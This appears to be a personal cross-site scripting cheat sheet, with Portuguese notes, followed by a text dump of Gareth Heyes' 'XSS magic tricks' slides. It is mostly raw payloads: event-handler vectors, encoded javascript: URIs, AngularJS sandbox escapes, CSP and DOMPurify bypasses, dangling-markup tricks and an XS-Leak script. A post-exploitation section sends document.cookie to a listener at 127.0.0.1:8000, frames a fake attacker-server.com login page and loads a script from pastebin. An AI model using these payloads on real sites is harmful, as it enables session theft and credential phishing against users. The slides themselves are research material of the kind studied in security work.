<audio/src/onloadstart=alert``>
<audio src onloadstart=alert``>
<audio/src/onloadstart=alert(2)>
<input onfocus=alert(1) id=x>
<input onfocus=alert(1)>
<input onblur=alert(1)>





<input type="hidden"  accesskey="x" value="XSS">
<link rel="caconical" accesskey="X" onclick="alert(1)" />
<a href=//google.com><font size=100 color=red>CLICK ME</font></a><base target="
<input name=x type=hidden form=x value="&lt;a href=//evil.com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></button><form id=x target="
<input name=x type=hidden form=x value="&lt;a href=//evil-com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/ font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></ button><form id=x target="


alert``
onerror=alert;throw 1
<img src=x throw onerror=eval,"=alert\x281x29"//Uncaught = alert(1)>
<x/><title>&lt;/title&gt;&lt;img src=1 onerror=alert(1)&gt






<style/onload=alert()>
<style onload=alert()>
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
javascript:alert(1)
javasc%0aript%3aalert(1)
javas%0a%0dcript%3aalert(1)





------------------------------------------------------------------------------------------------------
Para testar payloads que contenham javascript, escreva no navegador:
data:text/html, <a href="javascript:alert()">aaaa</a>
======================================================================================================
Para testar payloads que contenham <>, escreva no navegador:
data:text/html, <img src=x onerror=alert()>
------------------------------------------------------------------------------------------------------
[+][+][+]      Ap√≥s o sucesso da execu√ß√£o!!!!    [+][+][+]


Cria√ß√£o de um iframe
<iframe src="https://attacker-server.com/login" width="100%" height="100%" frameborder="0" marginheight="0" marginwidth="0" scrolling="no"></iframe>

Extrair cookies e manda-los diretamente para o atacante: 
javascript:image = new Image(); image.src='http://127.0.0.1:8000?cookies='%2bdocument.cookie

Mario game
javascript:document.write='<iframe src=https://www.jogos360.com.br/super_flash_mario_bros.html  width=800 height=700>'
javascript:document.write='%3ciframe src=https://www.jogos360.com.br/super_flash_mario_bros.html  width=800 height=700%3e'
javascript:document.write%3D%27%253ciframe%20src%3Dhttps://www.jogos360.com.br/super_flash_mario_bros.html%20%20width%3D800%20height%3D700%253e%27

Space Invaders
javascript:document.write%3D'<iframe src%3Dhttps:%2F%2Ffunhtml5games.com%2Fspaceinvaders%2Findex.html%20 width%3D800 height%3D700>'
<script/src=//pastebin.com/raw/3y29Q8dw></script><!--
On/Off

javascript:document.write='<iframe src=https://js13kgames.com/games/onoff/index.html  width=700 height=700>''
%09javascript:document.write%3d%27%253cimg%20src=%22http://127.0.0.1:8000?cookie=%27%20%2b%20document.cookie%20%2b%20%27%22%20/%253e%27
%09javascript:document.write='<img src="http://127.0.0.1:8000?cookie=' %2b document.cookie %2b '" />'
%09javascript:document.write='<img src=x onerror=this.src='http://127.0.0.1:8000/?c='%2bdocument.cookie'" />'



SSTI "Angular-JS"

{{constructor.constructor('alert(1)')()}} ‚Ä¢ Can we make it shorter? ‚Ä¢ {{$eval.constructor('alert(1)')()}} ‚Ä¢ Shorter still?‚Ä® {{$on.constructor('alert(1)')



More:
https://www.slideshare.net/GarethHeyes/xss-magic-tricks?fbclid=IwAR1DZL2fu-3UGTUyUJnleAP0CFhN_1TuFZCwVH0acEx8QEvABrtacVg_bCE


1. XSS magic tricks Advancements in XSS By Gareth Heyes @garethheyes
2. ‚Ä¢ I ‚ù§ hacking JavaScript‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä¢ I'm a researcher at PortSwigger ‚Ä¢ Follow me on Twitter @garethheyes About me <a href=# name=x id=x>Click me on IE11</a> <script event="onclick(blah)<wtfbbq>{}" for=x> blah.view.alert(1) </script> <script event=onload for=window> return alert(2)};{ </script>
3. Hacking filters
4. ‚Ä¢ Consuming tags ‚Ä¢ title, noscript, style, script, noembed, textarea, plaintext, template, iframe, noframes‚Ä® ‚Ä® ‚Ä® ‚Ä® ‚Ä¢ Template tag breaks out of select element <noframes> <img alt=" "> </noframes> <img alt=" "> </noframes> </noframes><script>alert(1)</script> Hacking filters <template><select><option></template><img src=1 onerror=alert(1)></select></template>
5. ‚Ä¢ Title exists in SVG and HTML ‚Ä¢ Title consumes markup in HTML but not in SVG ‚Ä¢ HTML in SVG? Hacking filters
6. Hacking filters <svg> <image> <title> <img title="</title><script>alert(1)</script>"> </title> </svg> üö´
7. Hacking filters <svg> <img> <title> <img title="</title><script>alert(1)</script>"> </title> </svg> ‚úÖ
8. ‚Ä¢ Edge bug causes title mutate ‚Ä¢ E.g. ‚Ä® in: <title>&lt;img&gt;‚Ä® out:<title><img> ‚Ä¢ I used this bug to bypass DOMPurify ‚Ä¢ in: <x/><title>&lt;/title&gt;&lt;img src=1 onerror=alert(1)&gt;‚Ä® out: <title></title><img src="1"> ‚Ä¢ What about double HTML encoded? ‚Ä¢ in: <x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;‚Ä® out: <title></title><img src=1 onerror=alert(1)></title> Hacking filters
9. ‚Ä¢ Invalid attributes‚Ä® <img ="/src/onerror=alert(1)//"> ‚Ä¢ HTML closing comments Firefox (version <=67)‚Ä® <!-- --!‚Ä® ><img src=1 onerror=alert(1)> --> ‚Ä¢ HTML opening comments Firefox (version 68.0.1)‚Ä® <!-[x00][x00][x00][x00][x00]- ><div title="--><img src=1 onerror=alert(1)>"></div> Hacking filters
10. ‚Ä¢ Firefox allows NULLs in entities ‚Ä¢ <a href="javascript&[0x00]#x6a;avascript:alert(1)">‚Ä® test</a> ‚Ä¢ <a href="javascript&[0x00]colon[0x00];alert(1)">‚Ä® test</a> Hacking filters
11. ‚Ä¢ Safari base tag ‚Ä¢ <base href="javascript:/a/-alert(1)///////"> ‚Ä¢ Turns every relative URL into XSS ‚Ä¢ <a href=../lol/safari.html>test</a> ‚Ä¢ <a href>haha</a> Hacking filters
12. XSS without parenthesis and semi-colons
13. ‚Ä¢ Everyone knows about alert`1` ‚Ä¢ I found you could do: onerror=alert;throw 1 ‚Ä¢ throw accepts a JavaScript expression XSS without parenthesis and semi-colons
14. ‚Ä¢ JavaScript expressions ‚Ä¢ x = (1,2);‚Ä® x//2 ‚Ä¢ Right hand side of expression is returned XSS without parenthesis and semi-colons
15. throw onerror=alert,'some string', 123,'haha' ‚Ä¢ First part of the expression is executed sets the error handler ‚Ä¢ Last part of the expression is sent to exception handler XSS without parenthesis and semi-colons
16. ‚Ä¢ How can you eval a string? ‚Ä¢ Prefixed with uncaught ‚Ä¢ Change it to an assignment‚Ä® ‚Ä® throw onerror=eval,"=alertx281x29"‚Ä® //Uncaught = alert(1) XSS without parenthesis and semi-colons
17. {onerror=eval}‚Ä® throw{lineNumber:1, columnNumber:1,‚Ä® fileName:1,‚Ä® message:'alertx281x29'} ‚Ä¢ Firefox prefixes exception message with:‚Ä® uncaught exception: 1 ‚Ä¢ How can we get round this? XSS without parenthesis and semi-colons
18. Hidden inputs
19. ‚Ä¢ XSS in hidden input ‚Ä¢ Unexploitable when <> is filtered?‚Ä® <input type="hidden" value="XSS HERE"> ‚Ä¢ Access keys to the rescue! ‚Ä¢ "The accesskey global attribute provides a hint for generating a keyboard shortcut for the current element." mdn Hidden inputs
20. ‚Ä¢ Firefox allows onclick event + access keys ‚Ä¢ <input type="hidden" accesskey="x" onclick="alert(1)">‚Ä® (ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) ‚Ä¢ Firefox only but the technique can be used on Chrome Hidden inputs
21. Link elements
22. ‚Ä¢ Access keys can be used on Chrome ‚Ä¢ Hidden inputs don't work ‚Ä¢ Other elements link, meta etc do‚Ä® <link rel="canonical" accesskey="X" onclick="alert(1)" />‚Ä® (ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) Link elements
23. Dangling markup
24. ‚Ä¢ Uses incomplete markup to extract parts of the page ‚Ä¢ <img src='//evil-server? ‚Ä¢ HTML parser finds an incomplete src attribute ‚Ä¢ Looks for ' to close the attribute Dangling markup
25. ‚Ä¢ Example dangling markup attacks ‚Ä¢ <table><tfoot background="//evil-server? ‚Ä¢ <link rel=icon href="//evil-server? ‚Ä¢ <video><source src="//evil? Dangling markup
26. ‚Ä¢ Chrome protects against dangling markup attacks ‚Ä¢ "Resource requests whose URLs contained both removed whitespace (`n`, `r`, `t`) characters and less-than characters (`<`) are blocked." https://www.chromestatus.com/feature/ 5735596811091968 ‚Ä¢ CSP will also block external requests if specified in the policy Dangling markup
27. ‚Ä¢ Bypassing restrictive CSP & Chrome mitigations ‚Ä¢ CSP: default-src 'none'; base-uri 'none'; ‚Ä¢ <base target=" ‚Ä¢ Sets target for every link ‚Ä¢ The markup will get passed in the window name Dangling markup
28. ‚Ä¢ <a href=//evil-server><font size=100 color=red>You must click me</font></a><base target=" ‚Ä¢ Anchor points to evil server ‚Ä¢ HTML styling is used to get round no inline styles ‚Ä¢ Target consumes all markup until the " is found ‚Ä¢ Clicking the link loads attackers server which reads window.name that contains the consumed markup Dangling markup
29. ‚Ä¢ Mitigation <base target="_self" /> ‚Ä¢ Prevents target being overwritten ‚Ä¢ Bypass requires 2 clicks ‚Ä¢ <input name=x type=hidden form=x value="&lt;a href=//evil-server&gt;&lt;font size=100 color=red&gt;Click me second&lt;/ font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></ button><form id=x target=" Dangling markup
30. Auto executing vectors
31. ‚Ä¢ Firefox onloadstart‚Ä® <img src=1 onloadstart=alert(1)> ‚Ä¢ Firefox onloadend‚Ä® <img src=1 onloadend=alert(1)> ‚Ä¢ <video><track default onload=alert(1) src="data:text/ vtt,WEBVTT"></video> Auto executing vectors
32. ‚Ä¢ Chrome‚Ä® <svg><discard onbegin=alert(1)> ‚Ä¢ Safari‚Ä® <svg><anything onload=alert(1)> ‚Ä¢ General svg ‚Ä® <svg><animate onbegin=alert(1) attributename=x dur=1s>‚Ä® <svg><set onend=alert(1) attributename=x dur=1s>‚Ä® <svg><animatetransform onrepeat=alert(1) attributename=x dur=1s repeatcount=2> Auto executing vectors
33. ‚Ä¢ <body onpageshow=alert(1)> ‚Ä¢ <body onpopstate=alert(1)>‚Ä® <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x-domain.com/#';flag=1}"> ‚Ä¢ <body onhashchange="alert(1)">‚Ä® <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x- domain.com#';window.flag=1;}"> ‚Ä¢ <body onmessage=alert(1)>‚Ä® <script>‚Ä® postMessage('test','*')‚Ä® </script> Auto executing vectors
34. ‚Ä¢ <body onbeforeunload="location='javascript:alert(1)'">‚Ä® <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x- domain.com#';flag=1}"> ‚Ä¢ <body onresize="alert(1)">‚Ä® <iframe src=//x-domain.com onload="this.style.width='1000px'"> ‚Ä¢ <body onscroll=alert(1)><div style=height:1000px></ div><div id=x></div> Auto executing vectors
35. ‚Ä¢ <style>‚Ä® @keyframes x{‚Ä® }‚Ä® </style>‚Ä® <b style="animation-name:x" onanimationstart="alert(1)"></b>‚Ä® <b style="-webkit-animation-name:x" onanimationstart="alert(1)"></b> ‚Ä¢ Discovered by the legend Mario Heiderich ‚Ä¢ Executes on every tag but requires an injected style Auto executing vectors
36. ‚Ä¢ ontransitionend works on Chrome ‚Ä¢ <style>‚Ä® :target {‚Ä® color:red;‚Ä® }‚Ä® </style>‚Ä® <x id=x style="transition:color 1s" ontransitionend=alert(1)> ‚Ä¢ URL: page.html#x Auto executing vectors
37. ‚Ä¢ ontransitionrun works on Firefox ‚Ä¢ <style>‚Ä® :target {‚Ä® color:red;‚Ä® }‚Ä® </style>‚Ä® <x id=y style="transition:color 2s" ontransitionrun=alert(1)> ‚Ä¢ URL: page.html ‚Ä¢ URL: page.html#x Auto executing vectors
38. ‚Ä¢ Firefox ontransitioncancel ‚Ä¢ <style>‚Ä® :target {‚Ä® color: red;‚Ä® }‚Ä® </style>‚Ä® <x id=x style="transition:color 10s" ontransitioncancel=alert(1)> ‚Ä¢ URL: page.html# ‚Ä¢ URL: page.html#x ‚Ä¢ URL: page.html# Auto executing vectors
39. ‚Ä¢ Remember the classic vector?‚Ä® <input autofocus onfocus=alert(1)> ‚Ä¢ Autofocus required? ‚Ä¢ Nope üòÄ <input onfocus=alert(1) id=x> ‚Ä¢ URL: page.html#x Auto executing vectors
40. ‚Ä¢ onblur becomes auto executable (Every browser except Firefox) ‚Ä¢ <input onblur=alert(1) id=x><input autofocus>‚Ä® <textarea onblur=alert(1) id=x></textarea><input autofocus>‚Ä® <button onblur=alert(1) id=x></button><input autofocus>‚Ä® <select onblur=alert(1) id=x></select><input autofocus> ‚Ä¢ URL: page.html#x ‚Ä¢ Focus events fire for iframes too ‚Ä¢ <body onblur=alert(1)><iframe id=x></iframe>‚Ä® <iframe id=x onblur=alert(1)></iframe><input autofocus> Auto executing vectors
41. ‚Ä¢ <embed id=x onfocus=alert(1) type=text/html> ‚Ä¢ <object id=x onfocus=alert(1) type=text/html> ‚Ä¢ <video id=x controls onfocus=alert(1)>‚Ä® <source src="validvideo.mp4" type=video/mp4>‚Ä® </video> ‚Ä¢ <audio id=x controls onfocus=alert(1) id=x>‚Ä® <source src="validaudio.wav">‚Ä® </audio> Auto executing vectors
42. AngularJS
43. ‚Ä¢ Standard AngularJS sandbox escape:‚Ä® {{constructor.constructor('alert(1)')()}} ‚Ä¢ Can we make it shorter? ‚Ä¢ {{$eval.constructor('alert(1)')()}} ‚Ä¢ Shorter still?‚Ä® {{$on.constructor('alert(1)')()}}‚Ä® //Credits Lewis Ardern AngularJS
44. ‚Ä¢ What if you can't call $eval? e.g. in a orderBy filter ‚Ä¢ Can't use strings ‚Ä¢ {{toString().constructor.prototype.charAt=[].join; [1,2]| orderBy:toString().constructor.fromCharCode(120,61,9 7,108,101,114,116,40,49,41)}} AngularJS
45. ‚Ä¢ CSP bypass for all versions of AngularJS ‚Ä¢ 63 characters! ‚Ä¢ <input id=x ng-focus=$event.path| orderBy:'CSS&&[1].map(alert)'> ‚Ä¢ page.html#x ‚Ä¢ Cross browser:‚Ä® <input id=x ng-focus=$event.composedPath()| orderBy:'CSS&&[1].map(alert)'> AngularJS
46. XS-Leak
47. ‚Ä¢ Focus event fires for iframe, input etc ‚Ä¢ Can we detect if this happens cross domain? ‚Ä¢ If it can be detected then id's can be bruteforced x-domain XS-Leak
48. ‚Ä¢ onblur event will be fired when cross domain element is focused ‚Ä¢ Hash can be checked multiple times with only 1 http request ‚Ä¢ Requires a frame-able page XS-Leak
49. XS-Leak Cross domain input element Same origin onblur event Same origin, shows current position <input id=1337> <body onblur="if(!window.found){window.found=true;alert('Found: '+pos)}"> <div id=y></div>
50. pos = 1000;found = false; var iframe = document.createElement('iframe');iframe.src='//x-domain.com'; document.body.appendChild(iframe);iframe.onload = next; function next() { if(!found){ document.getElementById('y').textContent = pos; iframe.src='//x-domain.com#'+pos; timer = setTimeout(function(){ if(!found && pos < 2000) { pos++; } next(); },50); } } //http://portswigger-labs.net/x-domain_leak_focus_095FD68DF/ XS-Leak
51. Auto execute on every tag?
52. ‚Ä¢ "The tabindex global attribute indicates if its element can be focused, and if/where it participates in sequential keyboard navigation" mdn ‚Ä¢ <a onfocus=alert(1) id=x tabindex=1> ‚Ä¢ <div onfocus=alert(1) id=x tabindex=1> ‚Ä¢ <xss onfocus=alert(1) id=x tabindex=1> ‚Ä¢ page.html#x Auto execute on every tag?
53. ‚Ä¢ Works on pretty much every tag ‚Ä¢ Link works but requires display block ‚Ä¢ <link onfocus=alert(1) id=x tabindex=1 style=display:block> ‚Ä¢ Link works in the body but not head Auto execute on every tag?
54. ‚Ä¢ <a onfocusin=alert(1) id=x tabindex=1> ‚Ä¢ <div onfocusin=alert(1) id=x tabindex=1> ‚Ä¢ <xss onfocusin=alert(1) id=x tabindex=1> ‚Ä¢ <xss onfocusout=alert(1) id=x tabindex=1><input autofocus> ‚Ä¢ page.html#x Auto execute on every tag?
55. ‚Ä¢ IE activate/beforeactivate event ‚Ä¢ <a onactivate=alert(1) id=x tabindex=1> ‚Ä¢ <div onactivate=alert(1) id=x tabindex=1> ‚Ä¢ <xss onactivate=alert(1) id=x tabindex=1> ‚Ä¢ <xss onbeforeactivate=alert(1) id=x tabindex=1> ‚Ä¢ page.html#x Auto execute on every tag?
56. ‚Ä¢ IE deactivate/beforedeactivate event ‚Ä¢ <a ondeactivate=alert(1) id=x tabindex=1></ a><input id=y autofocus> ‚Ä¢ <xss ondeactivate=alert(1) id=x tabindex=1></ xss><input id=y autofocus> ‚Ä¢ <xss onbeforedeactivate=alert(1) id=x tabindex=1></ a><input id=y autofocus> ‚Ä¢ page.html#x ‚Ä¢ page.html#y Auto execute on every tag?
57. Questions? thanks and shout outs to @garethheyes James Kettle, Mario Heiderich, Eduardo Vela, Masato Kinugawa, Filedescriptor, LeverOne, Ben Hayak, Alex Inf√ºhr, Mathias Karlsson, Jan Horn, Ian Hickey, G√°bor Moln√°r, tsetnep, Psych0tr1a, Skyphire, Abdulrhman Alqabandi, brainpillow, Kyo, Yosuke Hasegawa, White Jordan, Algol, jackmasa, wpulog, Bolk, Robert Hansen, David Lindsay, Superhei, Michal Zalewski, Renaud Lifchitz, Roman Ivanov, Frederik Braun, Krzysztof Kotowicz, Giorgio Maone, GreyMagic, Marcus Niemietz, Soroush Dalili, Stefano Di Paola, Roman Shafigullin, Lewis Ardern, Micha≈Ç Bentkowski <img src=1 onerror="alert('Wait. What. IE/Edge')};while(true)sendMeToTheJSBlackHole();function lol(){">
